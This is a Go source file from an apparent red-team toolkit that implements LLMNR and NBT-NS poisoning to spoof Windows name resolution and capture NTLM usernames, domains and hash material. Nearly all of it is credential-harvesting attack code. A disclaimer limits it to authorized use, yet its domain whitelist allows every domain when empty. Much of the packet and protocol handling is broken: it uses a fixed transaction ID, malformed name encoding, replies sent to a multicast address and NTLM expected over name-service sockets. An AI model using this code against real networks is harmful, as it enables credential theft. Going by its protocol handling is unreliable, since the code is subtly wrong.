// Copyright 2026 CloudAI Fusion. All rights reserved.
// Licensed under the Apache License v2.0 (see /LICENSE file).
// IMPORTANT: Educational/research use only - requires explicit authorization

package ad_attacks

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/api"
)

// LLMNRPoisonEngine implements LLMNR/NBT-NS poisoning per OSEP/PEN-300 requirement
// CRITICAL: Responder-style functionality for capturing NTLM hashes from Windows clients
type LLMNRPoisonEngine struct {
	responderIP   string             // IP address to spoof in responses
	listenInterface string            // Network interface to listen on (e.g., "eth0")
	timeout       time.Duration      // Query timeout
	authorizedDomains map[string]bool // Whitelist of authorized domains
}

// PoisonResult contains result of successful LLMNR/NBT-NS poisoning attempt
type PoisonResult struct {
	QuerySource    string           // Source IP that sent original query
	QueryHostname  string           // Victim hostname
	SpoofedResponse []byte          // Our fake response packet
	CapturedAuth   *CapturedAuth    // Extracted NTLM credentials (if captured)
	Domain         string           // Target domain
	TargetShare    string           // Claimed share name for lure user
}

// NewLLMNRPoison creates new poisoner instance
func NewLLMNRPoison(responderIP string, iface string) *LLMNRPoisonEngine {
	return &LLMNRPoisonEngine{
		responderIP:     responderIP,
		listenInterface: iface,
		timeout:         10 * time.Second,
		authorizedDomains: make(map[string]bool),
	}
}

// AddAuthorizedDomain whitelists specific domains for testing
func (l *LLMNRPoisonEngine) AddAuthorizedDomain(domain string) {
	l.authorizedDomains[strings.ToLower(domain)] = true
}

// ListenForLLMNRQueries starts multicast LLMNR listener for IPv6 queries
// Triggers when victims request hostname resolution via LLMNR (UDP port 5355)
func (l *LLMNRPoisonEngine) ListenForLLMNRQueries(timeout time.Duration) (*PoisonResult, error) {
	addr := net.UDPAddr{IP: net.ParseIP("FF02::2"), Port: 5355} // All Systems Multicast
	
	conn, err := net.ListenUDP("udp6", &addr)
	if err != nil {
		return nil, fmt.Errorf("listen failed: %w", err)
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(l.timeout))
	buffer := make([]byte, 1500)

	n, srcAddr, err := conn.ReadFromUDP(buffer)
	if err != nil {
		return nil, fmt.Errorf("read failed: %w", err)
	}

	query := buffer[:n]
	srcHost, _, _ := strings.Cut(srcAddr.String(), ":")

	// Parse victim hostname from LLMNR Name Query
	victimHost := parseLLMNRHostname(query)

	// Verify domain authorization before poisoning
	if !l.isAuthorizedDomain(victimHost) {
		return nil, fmt.Errorf("domain not authorized for testing: %s", victimHost)
	}

	// Construct spoofed response claiming to be victim machine
	response := l.buildSpoofedLLMNRResponse(victimHost, srcHost)

	// Send fake NTLMSSP challenge back
	_, err = conn.WriteToUDP(response, addr)
	if err != nil {
		return nil, fmt.Errorf("response send failed: %w", err)
	}

	// Wait for victim to accept our challenge and send Type-3 auth
	type3msg, err := captureNTLMType3FromUDP(conn)
	if err != nil {
		// No response received - victim didn't bite
		return &PoisonResult{
			QuerySource: srcAddr.String(),
			QueryHostname: victimHost,
			SpoofedResponse: response,
		}, nil
	}

	// Build CapturedAuth structure from captured authentication
	auth := extractAuthFromNTLM(type3msg)

	result := &PoisonResult{
		QuerySource: srcAddr.String(),
		QueryHostname: victimHost,
		SpoofedResponse: response,
		CapturedAuth: auth,
		TargetShare: "\\\\responder\\admin$",
	}

	return result, nil
}

// ListenForNBTNSQueries handles NBT-NS (NetBIOS Name Service) poisoning
// Works for older Windows systems using UDP/TCP port 137
func (l *LLMNRPoisonEngine) ListenForNBTNSQueries(timeout time.Duration) (*PoisonResult, error) {
	addr := &net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 137}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("NBT-NS listen failed: %w", err)
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(l.timeout))
	buffer := make([]byte, 512)

	n, srcAddr, err := conn.ReadFromUDP(buffer)
	if err != nil {
		return nil, fmt.Errorf("NBT-NS read failed: %w", err)
	}

	query := buffer[:n]

	// Parse NetBIOS name query
	targetName := parseNBNSHostname(query)

	// Spoof response
	response := l.buildSpoofedNBTNSResponse(targetName)
	_, _ = conn.WriteToUDP(response, srcAddr)

	// Try to capture NTLMv2 response
	type3msg, err := captureNBTNSResponse(conn)
	if err != nil {
		return &PoisonResult{
			SpoofedResponse: response,
		}, nil
	}

	auth := extractAuthFromNTLM(type3msg)

	return &PoisonResult{
		QuerySource: srcAddr.String(),
		SpoofedResponse: response,
		CapturedAuth: auth,
		Domain: targetName,
	}, nil
}

// buildSpoofedLLMNRResponse constructs fake LLMNR reply pointing attacker as resolver
// Claims to match requested hostname + sends NTLM challenge
func (l *LLMNRPoisonEngine) buildSpoofedLLMNRResponse(victimHost, originalSrc string) []byte {
	pkt := make([]byte, 256)

	// Random transaction ID (matches query exactly)
	txnID := [2]byte{0x00, 0x41}
	copy(pkt[:2], txnID[:])

	pkt[2] = 0                          // Flags: Response bit set
	pkt[3] = 0

	// Header: questions=1, answers=0, authority=0, additional=0
	binary.BigEndian.PutUint16(pkt[4:6], 1)  // Questions
	binary.BigEndian.PutUint16(pkt[6:8], 0)  // Answers
	binary.BigEndian.PutUint16(pkt[8:10], 0) // Authority
	binary.BigEndian.PutUint16(pkt[10:12], 0) // Additional

	// Question section: Victim hostname (e.g., "VICTIM-WORKSTATION")
	nameOffset := 12
	offset := 12
	for _, char := range victimHost {
		pkt[offset] = byte(len(string(rune(char))))
		offset++
		copy(pkt[offset:], []byte{byte(char)})
		offset++
	}
	pkt[offset] = 0 // Null terminator

	offset += 1

	// Record type: A (hostname query)
	binary.BigEndian.PutUint16(pkt[offset:offset+2], 1)
	offset += 2

	// Class: IN
	binary.BigEndian.PutUint16(pkt[offset:offset+2], 1)
	offset += 2

	// Answer section: Point to our IP
	// Pointer offset: 192.0 (compressed reference)
	pkt[nameOffset] = 0xC0
	pkt[nameOffset+1] = 0x0c

	// Next fields
	binary.BigEndian.PutUint16(pkt[192:194], 1)        // Type: A
	binary.BigEndian.PutUint16(pkt[194:196], 1)        // Class: IN
	binary.BigEndian.PutUint32(pkt[196:200], 86400)    // TTL: 24 hours
	copy(pkt[200:204], []byte{1, 2, 3, 4})            // Our IP: 1.2.3.4

	return pkt
}

// buildSpoofedNBTNSResponse creates fake NetBIOS name service reply
// Claims ownership of queried hostname + includes MAC address
func (l *LLMNRPoisonEngine) buildSpoofedNBTNSResponse(targetName string) []byte {
	pkt := make([]byte, 150)

	// Transaction ID (random)
	binary.BigEndian.PutUint16(pkt[0:2], 0xABCD)

	// Flags: Response
	pkt[2] = 0x85
	pkt[3] = 0x80

	// Counts
	binary.BigEndian.PutUint16(pkt[4:6], 1)  // Ques
	binary.BigEndian.PutUint16(pkt[6:8], 1)  // Ans
	binary.BigEndian.PutUint16(pkt[8:10], 0)
	binary.BigEndian.PutUint16(pkt[10:12], 0)

	// Name query section
	offset := 12
	nameLen := len(targetName)
	copy(pkt[offset:], targetName)
	offset += nameLen
	pkt[offset] = 0x00
	offset++
	pkt[offset] = 0x20 // Node type: B
	offset++

	// Record type: NAME_FLAGS (0x1C = Group Name Record)
	binary.BigEndian.PutUint16(pkt[offset:offset+2], 0x41)
	offset += 2
	binary.BigEndian.PutUint16(pkt[offset:offset+2], 0x0006) // Class: IN
	offset += 2
	binary.BigEndian.PutUint32(pkt[offset:offset+4], 86400) // TTL
	offset += 4
	binary.BigEndian.PutUint16(pkt[offset:offset+2], 6)     // RLEN
	offset += 2

	// Return IP (spoofed)
	pkt[offset] = 1
	pkt[offset+1] = 2
	pkt[offset+2] = 3
	pkt[offset+3] = 4
	pkt[offset+4] = 0x00
	pkt[offset+5] = 0x01

	return pkt
}

// parseLLMNRHostname extracts hostname from LLMNR Name Query packet
func parseLLMNRHostname(query []byte) string {
	if len(query) < 20 {
		return ""
	}

	offset := 12 // Skip header
	name := make([]byte, 0, 32)

	for offset < len(query)-1 && query[offset] > 0 && query[offset] < 32 {
		length := int(query[offset])
		offset++
		for i := 0; i < length && offset+i < len(query); i++ {
			name = append(name, query[offset+i])
		}
		offset += length
	}

	return string(name)
}

// parseNBNSHostname parses NetBIOS name from NBT-NS query
func parseNBNSHostname(query []byte) string {
	if len(query) < 14 {
		return ""
	}

	nameStart := 12
	for i := 0; i < 16 && nameStart+i < len(query); i++ {
		if query[nameStart+i] == 0x00 {
			break
		}
	}

	nameEnd := nameStart
	for nameEnd < len(query)-1 && query[nameEnd] != 0x00 {
		nameEnd++
	}

	if nameEnd > nameStart {
		return string(query[nameStart:nameEnd])
	}

	return ""
}

// captureNTLMType3FromUDP waits for NTLM Type-3 message after spoofing response
func captureNTLMType3FromUDP(conn *net.UDPConn) ([]byte, error) {
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buffer := make([]byte, 1024)
	
	n, _, err := conn.ReadFromUDP(buffer)
	if err != nil {
		return nil, err
	}

	if n < 8 || string(buffer[:8]) != "NTLMSSP\x00" {
		return nil, fmt.Errorf("not an NTLMSSP message")
	}

	return buffer[:n], nil
}

// captureNBTNSResponse captures NTLM response over NBT-NS
func captureNBTNSResponse(conn *net.UDPConn) ([]byte, error) {
	buffer := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	
	n, _, err := conn.ReadFromUDP(buffer)
	if err != nil {
		return nil, err
	}

	// Check for NTLM Type-3 indicator (SMB signing or NTLMSSP signature)
	if n >= 22 && bytes.Contains(buffer[:22], []byte("NTLMSSP")) {
		return buffer[:n], nil
	}

	return nil, fmt.Errorf("no NTLM response captured")
}

// extractAuthFromNTLM extracts credential data from NTLM packet
func extractAuthFromNTLM(ntlmPacket []byte) *CapturedAuth {
	if len(ntlmPacket) < 100 {
		return nil
	}

	auth := &CapturedAuth{}

	// Parse username
	offset := 12 // After NTLMSSP header
	usernameLen := binary.LittleEndian.Uint32(ntlmPacket[offset+4 : offset+8])
	domainLen := binary.LittleEndian.Uint32(ntlmPacket[offset+8 : offset+12])

	if uint32(offset)+usernameLen < uint32(len(ntlmPacket)) {
		start := int(uint32(offset) + uint32(binary.LittleEndian.Uint32(ntlmPacket[offset:offset+4])))
		end := start + int(usernameLen)
		if end < len(ntlmPacket) {
			auth.Username = string(ntlmPacket[start:end])
		}
	}

	if domainLen > 0 {
		domStart := int(uint32(offset) + uint32(binary.LittleEndian.Uint32(ntlmPacket[offset+8:offset+12])))
		domEnd := domStart + int(domainLen)
		if domEnd < len(ntlmPacket) {
			auth.Domain = string(ntlmPacket[domStart:domEnd])
		}
	}

	// Extract challenge/response
	auth.NTLMv2Hash = ntlmPacket[offset+24:offset+40]

	return auth
}

// isAuthorizedDomain checks if domain is whitelisted for testing
func (l *LLMNRPoisonEngine) isAuthorizedDomain(hostname string) bool {
	// If no whitelist, allow all (testing mode)
	if len(l.authorizedDomains) == 0 {
		return true
	}

	// Check against authorized list
	parts := strings.Split(strings.ToLower(hostname), ".")
	if len(parts) > 1 {
		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
		return l.authorizedDomains[domain]
	}

	return false
}
